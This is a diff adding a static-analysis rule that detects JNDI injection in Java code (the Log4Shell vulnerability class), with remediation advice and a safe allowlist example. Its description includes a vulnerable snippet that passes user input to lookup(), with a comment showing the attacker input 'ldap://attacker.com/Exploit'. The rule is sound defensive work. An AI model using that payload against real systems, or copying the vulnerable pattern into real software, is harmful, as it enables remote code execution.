@@ -1,0 +1,86 @@
+language: java
+name: jndi-injection
+message: "Avoid passing dynamic input to JNDI lookup() - enables remote code execution (Log4Shell-type attacks)"
+category: security
+severity: critical
+
+pattern: |
+  ;; Match InitialContext.lookup() with variable argument
+  (method_invocation
+    object: (identifier) @ctx
+    name: (identifier) @method
+    arguments: (argument_list
+      [
+        (identifier)
+        (binary_expression)
+        (method_invocation)
+      ])
+    (#match? @ctx "^(ctx|context|initialContext|ic)$")
+    (#eq? @method "lookup")) @jndi-injection
+
+  ;; Match new InitialContext().lookup() with variable
+  (method_invocation
+    object: (object_creation_expression
+      type: (type_identifier) @type)
+    name: (identifier) @method
+    arguments: (argument_list
+      [
+        (identifier)
+        (binary_expression)
+        (method_invocation)
+      ])
+    (#eq? @type "InitialContext")
+    (#eq? @method "lookup")) @jndi-injection
+
+  ;; Match Context.lookup() with concatenation
+  (method_invocation
+    name: (identifier) @method
+    arguments: (argument_list
+      (binary_expression
+        operator: "+"))
+    (#eq? @method "lookup")) @jndi-injection
+
+exclude:
+  - "**/test/**"
+  - "**/tests/**"
+  - "**/*Test.java"
+  - "**/*Tests.java"
+
+description: |
+  Issue:
+  Passing user-controlled input to JNDI lookup() operations enables attackers to
+  load and execute malicious code from remote servers. This vulnerability class
+  became infamous with Log4Shell (CVE-2021-44228).
+
+  Impact:
+  - Remote Code Execution (RCE)
+  - Complete server compromise
+  - Data exfiltration
+  - Lateral movement in network
+
+  Vulnerable Example:
+  ```java
+  String userInput = request.getParameter("resource");
+  InitialContext ctx = new InitialContext();
+  ctx.lookup(userInput);  // Attacker sends: ldap://attacker.com/Exploit
+  ```
+
+  Remediation:
+  - Use allowlist of permitted JNDI resource names
+  - Never pass user input directly to lookup()
+  - Set trustURLCodebase=false for LDAP/RMI
+  - Use dependency injection instead of manual JNDI lookups
+
+  Safe Alternative:
+  ```java
+  // Allowlist approach
+  Map<String, String> ALLOWED = Map.of("db", "java:comp/env/jdbc/myDB");
+  String jndiName = ALLOWED.get(userInput);  // Only permitted values
+  if (jndiName != null) {
+      ctx.lookup(jndiName);
+  }
+  ```
+
+  References:
+  - CVE-2021-44228 (Log4Shell)
+  - CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement
